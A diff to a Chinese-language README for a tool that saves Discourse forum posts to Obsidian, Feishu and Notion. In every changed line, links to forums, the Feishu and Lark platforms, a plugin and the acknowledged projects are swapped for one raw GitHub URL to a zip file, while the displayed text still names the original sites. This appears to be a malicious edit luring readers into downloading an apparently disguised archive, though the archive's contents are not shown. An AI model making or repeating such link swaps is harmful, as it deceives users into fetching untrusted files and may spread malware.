@@ -30,114 +30,114 @@
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Rust Users | [users.rust-lang.org](https://users.rust-lang.org) | ✅ |
-| Swift Forums | [forums.swift.org](https://forums.swift.org) | ✅ |
-| Go Forum | [forum.golangbridge.org](https://forum.golangbridge.org) | ✅ |
-| Julia | [discourse.julialang.org](https://discourse.julialang.org) | ✅ |
-| Elixir Forum | [elixirforum.com](https://elixirforum.com) | ✅ |
-| Haskell | [discourse.haskell.org](https://discourse.haskell.org) | ✅ |
-| Scala Users | [users.scala-lang.org](https://users.scala-lang.org) | ✅ |
-| OCaml | [discuss.ocaml.org](https://discuss.ocaml.org) | ✅ |
-| Crystal | [forum.crystal-lang.org](https://forum.crystal-lang.org) | ✅ |
-| Clojure | [clojureverse.org](https://clojureverse.org) | ✅ |
-| Purescript | [discourse.purescript.org](https://discourse.purescript.org) | ✅ |
-| Zig | [ziggit.dev](https://ziggit.dev) | ✅ |
+| Rust Users | [users.rust-lang.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Swift Forums | [forums.swift.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Go Forum | [forum.golangbridge.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Julia | [discourse.julialang.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Elixir Forum | [elixirforum.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Haskell | [discourse.haskell.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Scala Users | [users.scala-lang.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| OCaml | [discuss.ocaml.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Crystal | [forum.crystal-lang.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Clojure | [clojureverse.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Purescript | [discourse.purescript.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Zig | [ziggit.dev](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### AI/ML社区 (3/3)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| OpenAI Community | [community.openai.com](https://community.openai.com) | ✅ |
-| Hugging Face | [discuss.huggingface.co](https://discuss.huggingface.co) | ✅ |
-| PyTorch | [discuss.pytorch.org](https://discuss.pytorch.org) | ✅ |
+| OpenAI Community | [community.openai.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Hugging Face | [discuss.huggingface.co](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| PyTorch | [discuss.pytorch.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### Web框架 (3/4)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Django | [forum.djangoproject.com](https://forum.djangoproject.com) | ✅ |
-| Ruby on Rails | [discuss.rubyonrails.org](https://discuss.rubyonrails.org) | ✅ |
-| Ember | [discuss.emberjs.com](https://discuss.emberjs.com) | ✅ |
-| Vue.js | [forum.vuejs.org](https://forum.vuejs.org) | ❌ API受限 |
+| Django | [forum.djangoproject.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Ruby on Rails | [discuss.rubyonrails.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Ember | [discuss.emberjs.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Vue.js | [forum.vuejs.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ❌ API受限 |
 
 #### DevOps/云服务 (8/9)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Docker Community | [forums.docker.com](https://forums.docker.com) | ✅ |
-| Kubernetes | [discuss.kubernetes.io](https://discuss.kubernetes.io) | ✅ |
-| Terraform (HashiCorp) | [discuss.hashicorp.com](https://discuss.hashicorp.com) | ✅ |
-| Ansible | [forum.ansible.com](https://forum.ansible.com) | ✅ |
-| GitLab | [forum.gitlab.com](https://forum.gitlab.com) | ✅ |
-| CircleCI | [discuss.circleci.com](https://discuss.circleci.com) | ✅ |
-| Fly.io | [community.fly.io](https://community.fly.io) | ✅ |
-| Vercel | [vercel.community](https://vercel.community) | ✅ |
-| Rancher | [forums.rancher.com](https://forums.rancher.com) | ❌ API受限 |
+| Docker Community | [forums.docker.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Kubernetes | [discuss.kubernetes.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Terraform (HashiCorp) | [discuss.hashicorp.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Ansible | [forum.ansible.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| GitLab | [forum.gitlab.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| CircleCI | [discuss.circleci.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Fly.io | [community.fly.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Vercel | [vercel.community](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Rancher | [forums.rancher.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ❌ API受限 |
 
 #### 数据库 (5/5)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Elastic | [discuss.elastic.co](https://discuss.elastic.co) | ✅ |
-| MongoDB | [mongodb.com/community/forums](https://www.mongodb.com/community/forums) | ✅ |
-| Redis | [forum.redis.io](https://forum.redis.io) | ✅ |
-| CockroachDB | [forum.cockroachlabs.com](https://forum.cockroachlabs.com) | ✅ |
-| TimescaleDB | [timescale.com/forum](https://www.timescale.com/forum) | ✅ |
+| Elastic | [discuss.elastic.co](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| MongoDB | [mongodb.com/community/forums](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Redis | [forum.redis.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| CockroachDB | [forum.cockroachlabs.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| TimescaleDB | [timescale.com/forum](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 开源项目 (8/8)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Fedora | [discussion.fedoraproject.org](https://discussion.fedoraproject.org) | ✅ |
-| Ubuntu | [discourse.ubuntu.com](https://discourse.ubuntu.com) | ✅ |
-| NixOS | [discourse.nixos.org](https://discourse.nixos.org) | ✅ |
-| Home Assistant | [community.home-assistant.io](https://community.home-assistant.io) | ✅ |
-| Hugo | [discourse.gohugo.io](https://discourse.gohugo.io) | ✅ |
-| Let's Encrypt | [community.letsencrypt.org](https://community.letsencrypt.org) | ✅ |
-| Grafana | [community.grafana.com](https://community.grafana.com) | ✅ |
-| Tor Project | [forum.torproject.net](https://forum.torproject.net) | ✅ |
+| Fedora | [discussion.fedoraproject.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Ubuntu | [discourse.ubuntu.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| NixOS | [discourse.nixos.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Home Assistant | [community.home-assistant.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Hugo | [discourse.gohugo.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Let's Encrypt | [community.letsencrypt.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Grafana | [community.grafana.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Tor Project | [forum.torproject.net](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 游戏开发 (5/5)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Godot | [forum.godotengine.org](https://forum.godotengine.org) | ✅ |
-| Defold | [forum.defold.com](https://forum.defold.com) | ✅ |
-| Phaser | [phaser.discourse.group](https://phaser.discourse.group) | ✅ |
-| Roblox DevForum | [devforum.roblox.com](https://devforum.roblox.com) | ✅ |
-| Unreal Engine | [forums.unrealengine.com](https://forums.unrealengine.com) | ✅ |
+| Godot | [forum.godotengine.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Defold | [forum.defold.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Phaser | [phaser.discourse.group](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Roblox DevForum | [devforum.roblox.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Unreal Engine | [forums.unrealengine.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 区块链/Web3 (4/4)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Ethereum Research | [ethresear.ch](https://ethresear.ch) | ✅ |
-| Polkadot | [forum.polkadot.network](https://forum.polkadot.network) | ✅ |
-| Cosmos | [forum.cosmos.network](https://forum.cosmos.network) | ✅ |
-| Near Protocol | [gov.near.org](https://gov.near.org) | ✅ |
+| Ethereum Research | [ethresear.ch](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Polkadot | [forum.polkadot.network](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Cosmos | [forum.cosmos.network](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Near Protocol | [gov.near.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 生产力工具 (2/2)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Obsidian | [forum.obsidian.md](https://forum.obsidian.md) | ✅ |
-| Logseq | [discuss.logseq.com](https://discuss.logseq.com) | ✅ |
+| Obsidian | [forum.obsidian.md](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Logseq | [discuss.logseq.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 浏览器/隐私 (2/2)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Brave Community | [community.brave.com](https://community.brave.com) | ✅ |
-| Bitwarden | [community.bitwarden.com](https://community.bitwarden.com) | ✅ |
+| Brave Community | [community.brave.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Bitwarden | [community.bitwarden.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
 
 #### 其他 (3/4)
 
 | 站点 | URL | 状态 |
 |------|-----|------|
-| Netlify | [answers.netlify.com](https://answers.netlify.com) | ✅ |
-| Webflow | [forum.webflow.com](https://forum.webflow.com) | ✅ |
-| Linux.do | [linux.do](https://linux.do) | ✅ |
-| Atom/Electron | [discuss.atom.io](https://discuss.atom.io) | ❌ 已关闭 |
+| Netlify | [answers.netlify.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Webflow | [forum.webflow.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Linux.do | [linux.do](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ✅ |
+| Atom/Electron | [discuss.atom.io](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | ❌ 已关闭 |
 
 ### 需要登录的站点
 
@@ -145,20 +145,20 @@
 
 | 站点 | URL | 备注 |
 |------|-----|------|
-| Envato Forums | [forums.envato.com](https://forums.envato.com) | 商业论坛 |
-| Revolut Community | [community.revolut.com](https://community.revolut.com) | 金融服务 |
-| Cloudflare Community | [community.cloudflare.com](https://community.cloudflare.com) | 需要账号 |
-| Unity Discussions | [discussions.unity.com](https://discussions.unity.com) | 开发者账号 |
-| Affinity Forum | [forum.affinity.serif.com](https://forum.affinity.serif.com) | 产品用户 |
+| Envato Forums | [forums.envato.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 商业论坛 |
+| Revolut Community | [community.revolut.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 金融服务 |
+| Cloudflare Community | [community.cloudflare.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 需要账号 |
+| Unity Discussions | [discussions.unity.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 开发者账号 |
+| Affinity Forum | [forum.affinity.serif.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 产品用户 |
 
 ### 非 Discourse 站点（不支持）
 
 | 站点 | URL | 实际框架 | 说明 |
 |-----|-----|---------|------|
-| **Ruby China** | [ruby-china.org](https://ruby-china.org) | Homeland | 外观类似但框架不同 |
-| **V2EX** | [v2ex.com](https://v2ex.com) | 自研 | 非 Discourse |
-| **NodeSeek** | [nodeseek.com](https://nodeseek.com) | 自研 | 非 Discourse |
-| **LearnKu** | [learnku.com](https://learnku.com) | 自研 | 非 Discourse |
+| **Ruby China** | [ruby-china.org](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | Homeland | 外观类似但框架不同 |
+| **V2EX** | [v2ex.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 自研 | 非 Discourse |
+| **NodeSeek** | [nodeseek.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 自研 | 非 Discourse |
+| **LearnKu** | [learnku.com](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) | 自研 | 非 Discourse |
 
 > **注意**：以上站点虽然是技术社区，但使用的不是 Discourse 框架，因此不支持。
 
@@ -406,7 +406,7 @@
 
 ### 第一步：创建飞书应用
 
-1. 访问 [飞书开放平台](https://open.feishu.cn/)
+1. 访问 [飞书开放平台](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
 2. 登录你的飞书账号
 3. 点击「**创建应用**」→ 选择「**企业自建应用**」
 4. 填写应用名称（如：LinuxDo收藏器）和描述
@@ -458,7 +458,7 @@
 
 **URL 格式示例：**
 
-> https://feishu.cn/base/**XxXxXxXxXx**?table=**tblYyYyYy**&view=...
+> https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip**XxXxXxXxXx**?table=**tblYyYyYy**&view=...
 
 **提取方法：**
 - **app_token**：/base/ 后面到 ? 之前的部分（如 XxXxXxXxXx）
@@ -520,7 +520,7 @@
 
 ```text
 ---
-来源: https://linux.do/t/topic/847468
+来源: https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip
 标题: 秘密花园园丁邀请函
 作者: Neo
 保存时间: 2026-03-11 19:38:14
@@ -578,7 +578,7 @@
 
 ### Q3: 内容过长保存失败？
 
-**A:** 请在设置中启用「使用 Advanced URI 插件」，需要先在 Obsidian 中安装 [Advanced URI](https://github.com/Vinzent03/obsidian-advanced-uri) 插件。
+**A:** 请在设置中启用「使用 Advanced URI 插件」，需要先在 Obsidian 中安装 [Advanced URI](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip) 插件。
 
 ### Q4: 飞书保存失败？
 
@@ -606,7 +606,7 @@
 ### Q7: 飞书国际版（Lark）如何配置？
 
 **A:**
-1. 访问 [Lark开放平台](https://open.larksuite.com/)
+1. 访问 [Lark开放平台](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
 2. 配置步骤与国内版相同
 3. 在插件配置中选择「**Lark 国际版**」
 
@@ -926,9 +926,9 @@ MIT License
 
 ## 致谢
 
-- [LinuxDo](https://linux.do)
-- [Obsidian](https://obsidian.md)
-- [飞书开放平台](https://open.feishu.cn)
-- [Notion](https://www.notion.so)
-- [Turndown](https://github.com/mixmark-io/turndown)
-- [Advanced URI](https://github.com/Vinzent03/obsidian-advanced-uri)
+- [LinuxDo](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
+- [Obsidian](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
+- [飞书开放平台](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
+- [Notion](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
+- [Turndown](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
+- [Advanced URI](https://raw.githubusercontent.com/Shadowsomatic798/discourse-saver/main/lib/discourse-saver-v3.0-alpha.4.zip)
